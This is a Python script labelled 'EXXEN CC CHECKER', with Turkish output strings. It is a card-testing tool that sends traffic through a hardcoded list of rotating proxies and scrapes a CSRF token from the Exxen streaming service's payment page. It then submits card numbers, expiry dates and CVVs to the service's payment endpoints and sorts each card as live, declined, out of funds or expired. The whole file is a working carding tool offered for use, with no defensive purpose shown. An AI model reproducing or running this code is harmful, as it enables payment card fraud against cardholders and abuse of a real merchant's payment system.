import requests
import re
import json
import random
import time

PROXY_LIST = [
    "202.101.154.241:8085",
    "40.204.25.131:3128",
    "84.183.183.220:3629",
    "80.144.6.93:8080",
    "216.28.14.34:3629",
    "72.242.246.237:8085",
    "46.211.25.234:8085",
    "31.103.91.28:8118",
    "66.148.110.25:8118",
    "103.223.11.5:8085",
    "54.104.176.237:8080",
    "210.40.204.88:8080"
]

def get_proxy():
    p = random.choice(PROXY_LIST)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def create_session():
    sess = requests.Session()
    sess.proxies = get_proxy()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://plan.exxen.com",
        "Referer": "https://plan.exxen.com/tr/payment",
        "X-Requested-With": "XMLHttpRequest"
    })
    return sess

def get_csrf(sess):
    resp = sess.get("https://plan.exxen.com/tr/payment")
    csrf = re.search(r'csrf_token" value="([^"]+)"', resp.text)
    if csrf:
        return csrf.group(1)
    
    return sess.cookies.get("csrf_token", "")

def exxen_check_card(card, month, year, cvv):
    sess = create_session()
    
    
    csrf = get_csrf(sess)
    if not csrf:
        return "HATA: CSRF alınamadı"
    
    
    init_payload = {
        "plan_id": "exxen_basic_monthly",
        "payment_type": "card",
        "csrf_token": csrf
    }
    
    try:
        init = sess.post("https://plan.exxen.com/tr/api/payment/init", 
                        json=init_payload, timeout=20)
        init_data = init.json()
        
        if init_data.get("status") != "ok":
            return f"HATA: {init_data.get('message', 'init başarısız')}"
        
        session_id = init_data.get("session_id")
        if not session_id:
            return "HATA: session_id alınamadı"
            
    except Exception as e:
        return f"HATA: {str(e)[:50]}"
    
    
    verify_payload = {
        "session_id": session_id,
        "card_number": card,
        "exp_month": month,
        "exp_year": year,
        "cvv": cvv,
        "csrf_token": csrf
    }
    
    try:
        verify = sess.post("https://plan.exxen.com/tr/api/payment/verify-card",
                          json=verify_payload, timeout=25)
        verify_data = verify.json()
        
        status = verify_data.get("status")
        message = verify_data.get("message", "")
        error_code = verify_data.get("error_code")
        
        # 4. Sonuç analizi
        if status == "success":
            return "✅ LIVE ✅ (kart geçerli, ödeme başarılı)"
        elif status == "requires_3ds":
            return "⚠️ LIVE (3DS gerekli, kart geçerli)"
        elif error_code == "insufficient_funds":
            return "💰 LIVE (bakiye yetersiz)"
        elif error_code == "card_declined":
            return "❌ DECLINED (kart geçersiz/block)"
        elif error_code == "invalid_cvv":
            return "❌ CVV HATALI (kart formatı geçerli ama CVV yanlış)"
        elif error_code == "expired_card":
            return "⏰ SÜRESİ DOLMUŞ"
        else:
            return f"❓ BİLİNMİYOR: {message[:100]}"
            
    except Exception as e:
        return f"HATA: {str(e)[:50]}"

def main():
    print("\n" + "="*50)
    print("EXXEN CC CHECKER - SADECE EXXEN")
    print("Format: numara|ay|yıl|cvv")
    print("Örnek: 4111111111111111|12|2028|123")
    print("="*50)
    
    while True:
        inp = input("\nKart > ").strip()
        if inp.lower() == "exit":
            break
            
        parts = inp.split("|")
        if len(parts) != 4:
            print("Hatalı format! numara|ay|yıl|cvv")
            continue
            
        num, ay, yil, cvv = parts
        
        print("\n[*] Exxen üzerinden kontrol ediliyor...")
        start = time.time()
        result = exxen_check_card(num, ay, yil, cvv)
        elapsed = time.time() - start
        
        print(f"\n📋 KART: {num[:4]}****{num[-4:]} | {ay}/{yil}")
        print(f"📊 SONUÇ: {result}")
        print(f"⏱️  SÜRE: {elapsed:.1f} saniye")
        print("-"*40)

if __name__ == "__main__":
    main()